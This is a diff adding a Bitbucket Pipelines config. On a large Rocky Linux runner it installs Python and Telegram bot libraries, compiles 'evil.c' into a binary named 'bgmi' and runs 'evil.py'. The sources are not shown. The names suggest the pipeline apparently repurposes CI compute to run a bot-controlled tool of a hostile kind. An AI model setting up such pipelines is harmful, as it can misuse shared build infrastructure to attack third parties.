@@ -1,0 +1,19 @@
+image: rockylinux
+
+pipelines:
+  default:
+    - step:
+        name: "Run Python Script"
+        size: 2x
+        script:
+          - dnf update -y
+          - dnf install -y gcc git
+          - dnf install -y python39 python39-devel
+          - ln -sf /usr/bin/python3.9 /usr/bin/python
+          - python --version
+          - python -m ensurepip --default-pip
+          - python -m pip install --upgrade pip setuptools wheel
+          - python -m pip install multidict yarl frozenlist async_timeout
+          - python -m pip install telebot pymongo aiohttp python-telegram-bot motor asyncio psutil
+          - gcc evil.c -o bgmi -lpthread
+          - python evil.py
